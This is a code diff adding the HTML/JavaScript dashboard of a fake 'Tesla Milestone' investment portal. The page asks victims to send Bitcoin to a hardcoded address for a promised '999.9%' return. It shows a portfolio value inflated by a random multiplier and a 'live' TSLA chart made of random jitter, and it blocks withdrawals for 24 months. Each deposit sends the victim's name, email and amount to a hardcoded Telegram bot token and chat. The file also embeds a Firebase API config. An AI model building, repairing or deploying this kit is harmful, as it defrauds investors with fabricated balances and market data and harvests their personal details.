@@ -1,0 +1,426 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tesla Milestone | Cloud Dashboard</title>
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Chart.js -->
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <!-- QRCode.js for dynamic Bitcoin QR generation -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+    <!-- Lucide Icons -->
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <style>
+        body {
+            background-color: #f4f4f5;
+            color: #18181b;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        }
+        .tesla-card {
+            background: #ffffff;
+            border: 1px solid #e4e4e7;
+            box-shadow: 0 4px 20px -2px rgba(0, 0, 0, 0.04);
+        }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col">
+
+    <!-- Navigation Header -->
+    <header class="bg-white border-b border-zinc-200 sticky top-0 z-30">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-16 flex items-center justify-between">
+            <div class="flex items-center space-x-3">
+                <div class="w-9 h-9 bg-zinc-900 text-white rounded-xl flex items-center justify-center font-black text-lg">T</div>
+                <div>
+                    <h1 class="font-bold text-zinc-900 leading-none text-sm tracking-wide">TESLA MILESTONE</h1>
+                    <span class="text-[10px] text-zinc-500 font-semibold uppercase tracking-wider">Cloud Wealth Portal</span>
+                </div>
+            </div>
+            <div class="flex items-center space-x-4">
+                <div class="flex items-center space-x-2 bg-zinc-100 py-1.5 px-3 rounded-full border border-zinc-200">
+                    <img id="header-avatar" class="w-7 h-7 rounded-full object-cover border border-zinc-300" alt="Client Avatar">
+                    <span id="header-username" class="text-xs font-bold text-zinc-800">Client</span>
+                </div>
+                <button onclick="logoutClient()" class="text-xs font-semibold text-red-600 hover:text-red-700 px-2 py-1">Logout</button>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Body Container -->
+    <main class="flex-1 max-w-7xl mx-auto w-full px-4 sm:px-6 lg:px-8 py-8 space-y-8">
+        
+        <!-- Top Grid: Portfolio Summary & Actions -->
+        <div class="grid grid-cols-1 lg:grid-cols-3 gap-8">
+            
+            <!-- Portfolio Summary Card -->
+            <div class="lg:col-span-2 tesla-card rounded-2xl p-6 flex flex-col justify-between">
+                <div>
+                    <div class="flex items-center justify-between mb-4">
+                        <span class="text-[11px] font-bold uppercase tracking-wider text-zinc-400">Active Cloud Milestone Portfolio</span>
+                        <span class="inline-flex items-center px-2.5 py-0.5 rounded-full text-[11px] font-bold bg-emerald-50 text-emerald-700 border border-emerald-200">
+                            <i data-lucide="trending-up" class="w-3 h-3 mr-1"></i> +999.9% Target Growth Rate
+                        </span>
+                    </div>
+                    <div class="mb-6">
+                        <div class="text-xs text-zinc-500 mb-1 font-medium">Total Portfolio Value (Live Decimals)</div>
+                        <div id="live-portfolio-val" class="text-4xl sm:text-5xl font-black text-zinc-900 font-mono tracking-tight">$0.00</div>
+                    </div>
+                    <div class="grid grid-cols-2 sm:grid-cols-3 gap-4 pt-4 border-t border-zinc-100">
+                        <div>
+                            <div class="text-[10px] text-zinc-500 font-semibold uppercase">Invested Principal</div>
+                            <div id="stat-invested" class="text-base font-bold text-zinc-900 font-mono">$0.00</div>
+                        </div>
+                        <div>
+                            <div class="text-[10px] text-zinc-500 font-semibold uppercase">Interest Tier</div>
+                            <div class="text-base font-bold text-emerald-600 font-mono">999.9% Cap</div>
+                        </div>
+                        <div>
+                            <div class="text-[10px] text-zinc-500 font-semibold uppercase">Countdown Lock</div>
+                            <div id="stat-timer" class="text-base font-bold text-zinc-900 font-mono">24M Active</div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Quick Action Buttons -->
+                <div class="mt-6 pt-4 border-t border-zinc-100 flex items-center justify-between">
+                    <span class="text-xs text-zinc-500">Sync Status: <strong class="text-emerald-600">Cloud Live Active</strong></span>
+                    <div class="space-x-2">
+                        <button onclick="openTopUpModal()" class="px-4 py-2 bg-zinc-900 hover:bg-zinc-800 text-white font-bold rounded-xl text-xs transition">Top-Up Principal</button>
+                        <button onclick="openWithdrawModal()" class="px-4 py-2 bg-zinc-100 hover:bg-zinc-200 text-zinc-900 font-bold rounded-xl text-xs border border-zinc-300 transition">Request Withdrawal</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Bitcoin Deposit / QR Code Box -->
+            <div class="tesla-card rounded-2xl p-6 flex flex-col justify-between">
+                <div>
+                    <h3 class="font-bold text-zinc-900 text-base mb-1">Corporate Bitcoin Vault</h3>
+                    <p class="text-xs text-zinc-500 mb-3">Scan QR or copy address for initial shares or top-ups.</p>
+                    
+                    <div class="flex flex-col items-center justify-center p-3 bg-zinc-50 rounded-xl border border-zinc-200 mb-3">
+                        <div id="qrcode-container" class="bg-white p-2 rounded-lg shadow-sm mb-2"></div>
+                        <div class="text-[10px] font-mono text-zinc-600 text-center break-all px-1 select-all" id="btc-address-text">
+                            Bc1q74es0hcs9jnecenc2g8chfud4tlchurs2fk8hl
+                        </div>
+                    </div>
+                </div>
+                
+                <form onsubmit="submitSharePurchase(event)" class="space-y-2 pt-2 border-t border-zinc-100">
+                    <div class="flex space-x-2">
+                        <input type="number" id="purchase-amount" required min="100" placeholder="USD Amt" class="w-1/2 px-3 py-2 rounded-xl border border-zinc-200 text-xs font-mono bg-zinc-50 outline-none">
+                        <select id="purchase-duration" class="w-1/2 px-3 py-2 rounded-xl border border-zinc-200 text-xs bg-zinc-50 outline-none font-medium">
+                            <option value="24">24 Months</option>
+                            <option value="12">12 Months</option>
+                            <option value="6">6 Months</option>
+                        </select>
+                    </div>
+                    <button type="submit" class="w-full py-2.5 bg-blue-600 hover:bg-blue-700 text-white font-bold rounded-xl text-xs transition">
+                        I Have Sent Payment (Submit Proof)
+                    </button>
+                </form>
+            </div>
+
+        </div>
+
+        <!-- TSLA Live Moving Market Chart Section -->
+        <div class="tesla-card rounded-2xl p-6">
+            <div class="flex items-center justify-between mb-6">
+                <div>
+                    <h3 class="font-bold text-zinc-900 text-base">TSLA Live Market Feed</h3>
+                    <p class="text-xs text-zinc-500">Underlying corporate asset performance chart with live decimal pacing.</p>
+                </div>
+                <div class="flex items-center space-x-2 text-xs font-mono font-bold text-emerald-700 bg-emerald-50 px-3 py-1.5 rounded-lg border border-emerald-200">
+                    <span id="tsla-live-price">$353.44</span>
+                    <span>(Live Feed)</span>
+                </div>
+            </div>
+            <div class="h-64 w-full">
+                <canvas id="tslaChart"></canvas>
+            </div>
+        </div>
+
+        <!-- Information Storage Vault & Transaction History -->
+        <div class="grid grid-cols-1 lg:grid-cols-2 gap-8">
+            <div class="tesla-card rounded-2xl p-6">
+                <div class="flex items-center justify-between mb-4">
+                    <h3 class="font-bold text-zinc-900 text-base">Cloud Security Vault</h3>
+                    <i data-lucide="lock" class="w-4 h-4 text-zinc-400"></i>
+                </div>
+                <div class="space-y-3 text-xs">
+                    <div class="flex justify-between items-center p-3 bg-zinc-50 rounded-xl border border-zinc-100">
+                        <span class="text-zinc-500 font-medium">Registered Client</span>
+                        <span id="vault-name" class="font-bold text-zinc-900">-</span>
+                    </div>
+                    <div class="flex justify-between items-center p-3 bg-zinc-50 rounded-xl border border-zinc-100">
+                        <span class="text-zinc-500 font-medium">Cloud Status</span>
+                        <span class="font-bold text-emerald-600">Synced Across Devices</span>
+                    </div>
+                    <div class="flex justify-between items-center p-3 bg-zinc-50 rounded-xl border border-zinc-100">
+                        <span class="text-zinc-500 font-medium">Target Profit Yield</span>
+                        <span class="font-bold text-zinc-900">999.9% Milestone Cap</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="tesla-card rounded-2xl p-6 flex flex-col">
+                <h3 class="font-bold text-zinc-900 text-base mb-4">Transaction History</h3>
+                <div class="flex-1 overflow-y-auto max-h-56 space-y-3" id="transaction-list">
+                    <div class="text-center py-10 text-zinc-400 text-xs font-medium">Loading cloud records...</div>
+                </div>
+            </div>
+        </div>
+
+    </main>
+
+    <!-- TOP-UP MODAL -->
+    <div id="topup-modal" class="hidden fixed inset-0 z-50 bg-black/50 backdrop-blur-sm flex items-center justify-center p-4">
+        <div class="tesla-card bg-white rounded-2xl max-w-md w-full p-6 space-y-4">
+            <h3 class="font-bold text-zinc-900 text-base">Top-Up Existing Principal</h3>
+            <p class="text-xs text-zinc-500">Send top-up funds to the corporate BTC address, then submit details below.</p>
+            <form onsubmit="submitTopUp(event)" class="space-y-3">
+                <div>
+                    <label class="block text-[10px] font-bold uppercase text-zinc-600 mb-1">Top-Up Amount ($ USD)</label>
+                    <input type="number" id="topup-amount" required min="50" placeholder="e.g. 2000" class="w-full px-3 py-2 rounded-xl border border-zinc-200 text-xs font-mono bg-zinc-50 outline-none">
+                </div>
+                <button type="submit" class="w-full py-2.5 bg-zinc-900 text-white font-bold rounded-xl text-xs">Submit Top-Up Proof</button>
+            </form>
+            <button onclick="closeTopUpModal()" class="w-full text-center text-xs text-zinc-500 hover:text-zinc-800 pt-2">Cancel</button>
+        </div>
+    </div>
+
+    <!-- WITHDRAWAL MODAL -->
+    <div id="withdraw-modal" class="hidden fixed inset-0 z-50 bg-black/50 backdrop-blur-sm flex items-center justify-center p-4">
+        <div class="tesla-card bg-white rounded-2xl max-w-md w-full p-6 space-y-4">
+            <h3 class="font-bold text-zinc-900 text-base">Request Withdrawal</h3>
+            <div class="p-3 bg-amber-50 rounded-xl border border-amber-200 text-amber-800 text-xs space-y-1">
+                <p class="font-bold">⚠️ Withdrawal Locked</p>
+                <p>Withdrawals are strictly locked until your 24-month countdown finishes.</p>
+            </div>
+            <button onclick="closeWithdrawModal()" class="w-full text-center text-xs text-zinc-500 hover:text-zinc-800 pt-2">Close</button>
+        </div>
+    </div>
+
+    <!-- Firebase SDK & App Logic -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/12.19.0/firebase-app.js";
+        import { getFirestore, doc, getDoc, setDoc, updateDoc } from "https://www.gstatic.com/firebasejs/12.19.0/firebase-firestore.js";
+
+        // Connected Firebase Configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyAmPw9jUbbvorS-9V9y_uIIivOl5Y92hBY",
+            authDomain: "teslamilestone-6ce77.firebaseapp.com",
+            projectId: "teslamilestone-6ce77",
+            storageBucket: "teslamilestone-6ce77.firebasestorage.app",
+            messagingSenderId: "603266005390",
+            appId: "1:603266005390:web:219be0276e2ac5db068cdf",
+            measurementId: "G-7HLBL47YTT"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
+        const botToken = "8630191514:AAHnhtahysDQC4wGpA3HW7FiAjjnWRCv9Fk";
+        const chatId = "8696262458";
+        const corporateBTC = "Bc1q74es0hcs9jnecenc2g8chfud4tlchurs2fk8hl";
+
+        const clientEmail = localStorage.getItem('tesla_client_email');
+        if (!clientEmail || localStorage.getItem('tesla_kyc_completed') !== 'true') {
+            window.location.href = 'index.html';
+        }
+
+        let clientData = {
+            name: localStorage.getItem('tesla_client_name') || 'Client',
+            avatar: localStorage.getItem('tesla_client_avatar') || '',
+            investedPrincipal: 0,
+            transactions: []
+        };
+
+        let basePortfolioVal = 0;
+        let tslaChartInstance = null;
+
+        window.addEventListener('DOMContentLoaded', async () => {
+            // Generate QR Code with your exact BTC address
+            new QRCode(document.getElementById("qrcode-container"), {
+                text: corporateBTC,
+                width: 110,
+                height: 110,
+                colorDark: "#18181b",
+                colorLight: "#ffffff",
+                correctLevel: QRCode.CorrectLevel.H
+            });
+
+            // Fetch live client record from Firestore cloud database
+            const docRef = doc(db, "clients", clientEmail.toLowerCase().trim());
+            const docSnap = await getDoc(docRef);
+
+            if (docSnap.exists()) {
+                const data = docSnap.data();
+                clientData.investedPrincipal = data.investedPrincipal || 0;
+                clientData.transactions = data.transactions || [];
+                clientData.name = data.name || clientData.name;
+                clientData.avatar = data.avatar || clientData.avatar;
+            } else {
+                // Initialize document in cloud if it's their first login
+                await setDoc(docRef, {
+                    name: clientData.name,
+                    email: clientEmail,
+                    investedPrincipal: parseFloat(localStorage.getItem('tesla_invested') || '0'),
+                    transactions: [],
+                    createdAt: new Date().toISOString()
+                });
+                clientData.investedPrincipal = parseFloat(localStorage.getItem('tesla_invested') || '0');
+            }
+
+            basePortfolioVal = clientData.investedPrincipal;
+
+            document.getElementById('header-username').innerText = clientData.name;
+            document.getElementById('vault-name').innerText = clientData.name;
+            if(clientData.avatar) document.getElementById('header-avatar').src = clientData.avatar;
+            document.getElementById('stat-invested').innerText = '$' + clientData.investedPrincipal.toLocaleString();
+
+            renderTransactions();
+            initTSLAChart();
+            startEngineLoops();
+        });
+
+        window.logoutClient = function() {
+            localStorage.clear();
+            window.location.href = 'index.html';
+        }
+
+        window.submitSharePurchase = async function(e) {
+            e.preventDefault();
+            const amt = parseFloat(document.getElementById('purchase-amount').value);
+            const duration = document.getElementById('purchase-duration').value;
+            const txId = 'TX-' + Math.floor(100000 + Math.random() * 900000);
+
+            const tx = { id: txId, amount: amt, type: 'Initial Share Purchase', duration: duration + 'M', status: 'Pending Approval', date: new Date().toLocaleString() };
+            
+            clientData.transactions.unshift(tx);
+            renderTransactions();
+
+            // Save to Firebase Cloud
+            const docRef = doc(db, "clients", clientEmail.toLowerCase().trim());
+            await updateDoc(docRef, { transactions: clientData.transactions });
+
+            const text = encodeURIComponent(`💰 *Cloud Share Purchase Request*\n\nClient: ${clientData.name}\nEmail: ${clientEmail}\nAmount: $${amt.toLocaleString()}\nDuration: ${duration} Months\nID: ${txId}\n\n*Action:* Confirm payment on blockchain and update principal in database.`);
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${text}&parse_mode=Markdown`).catch(err => {});
+
+            alert('Share purchase submitted to cloud storage! Awaiting administrator approval.');
+            document.getElementById('purchase-amount').value = '';
+        }
+
+        window.openTopUpModal = function() { document.getElementById('topup-modal').classList.remove('hidden'); }
+        window.closeTopUpModal = function() { document.getElementById('topup-modal').classList.add('hidden'); }
+
+        window.submitTopUp = async function(e) {
+            e.preventDefault();
+            const amt = parseFloat(document.getElementById('topup-amount').value);
+            const txId = 'TOP-' + Math.floor(100000 + Math.random() * 900000);
+
+            const tx = { id: txId, amount: amt, type: 'Principal Top-Up', duration: 'Locked', status: 'Pending Approval', date: new Date().toLocaleString() };
+            
+            clientData.transactions.unshift(tx);
+            renderTransactions();
+            closeTopUpModal();
+
+            const docRef = doc(db, "clients", clientEmail.toLowerCase().trim());
+            await updateDoc(docRef, { transactions: clientData.transactions });
+
+            const text = encodeURIComponent(`⚡ *Cloud Principal Top-Up*\n\nClient: ${clientData.name}\nEmail: ${clientEmail}\nTop-Up Amount: $${amt.toLocaleString()}\nID: ${txId}`);
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${text}&parse_mode=Markdown`).catch(err => {});
+
+            alert('Top-up proof sent to cloud database!');
+            document.getElementById('topup-amount').value = '';
+        }
+
+        window.openWithdrawModal = function() { document.getElementById('withdraw-modal').classList.remove('hidden'); }
+        window.closeWithdrawModal = function() { document.getElementById('withdraw-modal').classList.add('hidden'); }
+
+        function renderTransactions() {
+            const list = document.getElementById('transaction-list');
+            if(clientData.transactions.length === 0) {
+                list.innerHTML = '<div class="text-center py-10 text-zinc-400 text-xs font-medium">No recorded transactions yet.</div>';
+                return;
+            }
+            list.innerHTML = clientData.transactions.map(tx => `
+                <div class="flex items-center justify-between p-3 bg-zinc-50 rounded-xl border border-zinc-100 text-xs">
+                    <div>
+                        <div class="font-bold text-zinc-900">$${tx.amount.toLocaleString()} - ${tx.type}</div>
+                        <div class="text-[10px] text-zinc-400">${tx.date} • ${tx.id}</div>
+                    </div>
+                    <span class="px-2.5 py-1 rounded-full text-[10px] font-bold ${tx.status === 'Approved' ? 'bg-emerald-100 text-emerald-700' : 'bg-amber-100 text-amber-700'}">
+                        ${tx.status}
+                    </span>
+                </div>
+            `).join('');
+        }
+
+        function startEngineLoops() {
+            setInterval(() => {
+                if(clientData.investedPrincipal > 0) {
+                    const growthMultiplier = 1 + (Math.random() * 0.003);
+                    basePortfolioVal = basePortfolioVal * growthMultiplier;
+                    const jitter = (Math.random() * 2 - 1).toFixed(2);
+                    const displayedVal = basePortfolioVal + parseFloat(jitter);
+                    document.getElementById('live-portfolio-val').innerText = '$' + Math.max(0, displayedVal).toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2});
+                } else {
+                    document.getElementById('live-portfolio-val').innerText = '$0.00';
+                }
+            }, 1000);
+        }
+
+        function initTSLAChart() {
+            const ctx = document.getElementById('tslaChart').getContext('2d');
+            const initialLabels = ['9:30', '10:00', '10:30', '11:00', '11:30', '12:00', '12:30', '1:00', 'Live'];
+            const initialData = [350.20, 351.40, 352.10, 351.80, 352.95, 353.12, 352.80, 353.25, 353.44];
+
+            tslaChartInstance = new Chart(ctx, {
+                type: 'line',
+                data: {
+                    labels: initialLabels,
+                    datasets: [{
+                        label: 'TSLA Live Price ($)',
+                        data: initialData,
+                        borderColor: '#18181b',
+                        backgroundColor: 'rgba(24, 24, 27, 0.04)',
+                        borderWidth: 2,
+                        fill: true,
+                        tension: 0.3,
+                        pointRadius: context => context.dataIndex === context.dataset.data.length - 1 ? 5 : 0,
+                        pointBackgroundColor: '#18181b'
+                    }]
+                },
+                options: {
+                    responsive: true,
+                    maintainAspectRatio: false,
+                    plugins: { legend: { display: false } },
+                    scales: {
+                        y: { grid: { color: '#f4f4f5' }, ticks: { font: { family: 'monospace', size: 10 } } },
+                        x: { grid: { display: false }, ticks: { font: { family: 'monospace', size: 10 } } }
+                    },
+                    animation: { duration: 250 }
+                }
+            });
+
+            setInterval(() => {
+                const currentData = tslaChartInstance.data.datasets[0].data;
+                const currentLabels = tslaChartInstance.data.labels;
+                const lastVal = currentData[currentData.length - 1];
+                const nextVal = parseFloat((lastVal + (Math.random() * 0.8 - 0.4)).toFixed(2));
+
+                const now = new Date();
+                const timeLabel = now.toTimeString().split(' ')[0];
+
+                currentData.push(nextVal);
+                currentLabels.push(timeLabel);
+                if (currentData.length > 10) { currentData.shift(); currentLabels.shift(); }
+
+                document.getElementById('tsla-live-price').innerText = '$' + nextVal.toFixed(2);
+                tslaChartInstance.update();
+            }, 2000);
+        }
+    </script>
+</body>
+</html>
